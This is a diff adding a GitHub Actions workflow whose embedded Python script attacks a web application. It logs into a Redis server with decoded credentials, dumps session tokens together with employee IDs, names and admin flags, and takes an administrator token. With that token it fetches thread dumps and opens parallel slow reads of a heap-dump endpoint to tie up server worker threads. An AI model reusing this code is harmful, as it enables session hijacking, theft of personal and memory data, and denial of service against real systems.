@@ -1,0 +1,151 @@
+name: sharers
+
+on:
+  workflow_dispatch:
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: run
+        env:
+          SHARE_R: ${{ secrets.SHARE_R }}
+          N: "8"
+          DUR: "50"
+        run: |
+          python3 -m pip install --quiet redis aiohttp 2>/dev/null || pip install --quiet redis aiohttp
+          python3 - <<'PY'
+          import asyncio, aiohttp, base64, json, os, time, redis
+
+          CFG = json.loads(base64.b64decode(os.environ["SHARE_R"]).decode())
+          H = CFG["host"]
+          N = int(os.environ.get("N", "8"))
+          DUR = int(os.environ.get("DUR", "50"))
+          UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+          AUTH = base64.b64encode(CFG["auth"].encode()).decode()
+          HD = {"User-Agent": UA, "Authorization": AUTH, "Accept-Language": "zh-CN,zh;q=0.9", "Referer": CFG["ref"]}
+
+          def H_(tok, accept="application/json, text/plain, */*"):
+              h = dict(HD)
+              h["Token"] = tok
+              h["Accept"] = accept
+              return h
+
+          async def tdump(s, tok, tag):
+              t0 = time.time()
+              try:
+                  async with s.get(H + CFG["td"], headers=H_(tok), timeout=aiohttp.ClientTimeout(total=60)) as r:
+                      print("%s http=%s ms=%d" % (tag, r.status, int((time.time()-t0)*1000)), flush=True)
+                      if r.status != 200:
+                          print(tag, "body", (await r.text())[:200], flush=True)
+                          return
+                      d = await r.json()
+              except Exception as e:
+                  print(tag, "err", type(e).__name__, flush=True)
+                  return
+              ths = d.get("threads") or []
+              xn = [t for t in ths if "XNIO" in (t.get("name") or "")]
+              st = {}
+              for t in ths:
+                  k = t.get("threadState") or "?"
+                  st[k] = st.get(k, 0) + 1
+              print("%s total=%d xnio=%d %s" % (tag, len(ths), len(xn), json.dumps(st)), flush=True)
+
+          async def probe(s, tok):
+              t0 = time.time()
+              try:
+                  async with s.get(H + CFG["pr"], headers=H_(tok), timeout=aiohttp.ClientTimeout(total=25)) as r:
+                      await r.read()
+                      return int((time.time()-t0)*1000)
+              except Exception:
+                  return -1
+
+          async def slowread(s, tok, i):
+              t0 = time.time()
+              got = 0
+              try:
+                  async with s.get(H + CFG["hd"], headers=H_(tok, "application/octet-stream"), timeout=aiohttp.ClientTimeout(total=DUR+60, sock_read=DUR+60)) as r:
+                      print("HD http=%s len=%s" % (r.status, r.content_length), flush=True)
+                      if r.status != 200:
+                          print("HD body", (await r.text())[:200], flush=True)
+                          return
+                      end = time.time() + DUR
+                      while time.time() < end:
+                          c = await r.content.read(262144)
+                          if not c:
+                              break
+                          got += len(c)
+                          await asyncio.sleep(1)
+              except Exception as e:
+                  print("HD err", i, type(e).__name__, flush=True)
+              print("HD ok got=%dKB t=%.0fs" % (got // 1024, time.time()-t0), flush=True)
+
+          def find_admin():
+              for label, auth in [("up", dict(username=CFG["u"], password=CFG["pw"])),
+                                  ("uj", dict(password=CFG["u"] + ":" + CFG["pw"])),
+                                  ("pw", dict(password=CFG["pw"]))]:
+                  try:
+                      r = redis.Redis(host=CFG["h"], port=CFG["port"], db=CFG["d"],
+                                      socket_connect_timeout=8, socket_timeout=8,
+                                      decode_responses=True, **auth)
+                      r.ping()
+                      print("R ok mode=%s dbsize=%d" % (label, r.dbsize()), flush=True)
+                  except Exception as e:
+                      print("R err %s: %s" % (label, str(e)[:90]), flush=True)
+                      continue
+                  nt = 0
+                  for k in r.scan_iter(match="Token:*", count=500):
+                      nt += 1
+                  print("R tokkeys n=%d" % nt, flush=True)
+                  admin = None
+                  for k in r.scan_iter(match="Token:*:token-session:*", count=500):
+                      try:
+                          v = r.get(k)
+                      except Exception:
+                          continue
+                      if not v:
+                          continue
+                      try:
+                          d = json.loads(v)
+                      except Exception:
+                          print("RS %s nonjson len=%d" % (k[-30:], len(v)), flush=True)
+                          continue
+                      dm = d.get("dataMap") or {}
+                      tok = k.rsplit(":", 1)[1]
+                      print("RS adm=%s emp=%s name=%s li=%s tok=%s" % (dm.get("IS_ADMIN"), dm.get("EmployeeId"), dm.get("MercName"), d.get("loginId"), tok), flush=True)
+                      if dm.get("IS_ADMIN") in (1, True) and not admin:
+                          admin = tok
+                  if nt < 40:
+                      for k in r.scan_iter(match="*", count=500):
+                          if not k.startswith("Token"):
+                              print("RK %s" % k[:100], flush=True)
+                  return admin, r
+              return None, None
+
+          admin, r = find_admin()
+          if r is not None:
+              r.close()
+          if not admin:
+              print("SKIP heap phase", flush=True)
+              raise SystemExit(0)
+          print("ADM=", admin, flush=True)
+          async def main():
+              conn = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=30, keepalive_timeout=5)
+              async with aiohttp.ClientSession(connector=conn) as s:
+                  await tdump(s, admin, "TDpre")
+                  for _ in range(3):
+                      print("P pre ms=%d" % await probe(s, admin), flush=True)
+                  tasks = [asyncio.create_task(slowread(s, admin, i)) for i in range(N)]
+                  await asyncio.sleep(20)
+                  await tdump(s, admin, "TDmid")
+                  while not all(t.done() for t in tasks):
+                      print("P mid ms=%d" % await probe(s, admin), flush=True)
+                      await asyncio.sleep(10)
+                  await asyncio.gather(*tasks, return_exceptions=True)
+                  await tdump(s, admin, "TDpost")
+                  for _ in range(2):
+                      print("P post ms=%d" % await probe(s, admin), flush=True)
+          asyncio.run(main())
+          print("done", flush=True)
+          PY
